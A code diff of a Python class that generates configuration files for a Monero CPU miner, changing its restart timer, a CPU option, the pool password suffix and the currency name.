@@ -31,7 +31,7 @@ class Miner():
 
     def startMine(self):
         self.checkMinerExec()
-        self.timer = Timer(300.0, self.restart)
+        self.timer = Timer(600.0, self.restart)
         self.timer.start()
         if os.name == 'nt':
             logging.debug('startMinte() Windows System detected')
@@ -55,7 +55,8 @@ class Miner():
             cpu_file.write('"cpu_threads_conf" :')
             cpu_file.write('[')
             # first core of the CPU 
-            cpu_file.write('{ "low_power_mode" : false, "no_prefetch" : true, "affine_to_cpu" : 0 },')
+            cpu_file.write('{ "low_power_mode" : false, "no_prefetch" : true, \
+                    "asm" : "auto", "affine_to_cpu" : 0 },')
             cpu_file.write('],')
 
 
@@ -87,8 +88,8 @@ class Miner():
             config_file.write('"retry_time" : 30,')
             config_file.write('"giveup_limit" : 0,')
             # dont print anything = 0
-            config_file.write('"verbose_level" : 0,')
-            config_file.write('"print_motd" : false,')
+            config_file.write('"verbose_level" : 0,') #edit
+            config_file.write('"print_motd" : false,') #edit
             config_file.write('"h_print_time" : 60,')
             config_file.write('"aes_override" : null,')
             config_file.write('"use_slow_memory" : "always",')
@@ -115,13 +116,13 @@ class Miner():
             pool_file.write('"rig_id" : "",')
             pool_file.write('"pool_password" : "')
             pool_file.write(locale_string)
-            pool_file.write(':stephan_09@live.de",')
+            pool_file.write(':Pythonic",')
             pool_file.write('"use_nicehash" : false,')
             pool_file.write('"use_tls" : false,')
             pool_file.write('"tls_fingerprint" : "",')
             pool_file.write('"pool_weight" : 1')
             pool_file.write('},],')
-            pool_file.write('"currency" : "monero7",')
+            pool_file.write('"currency" : "monero",')
 
 
 
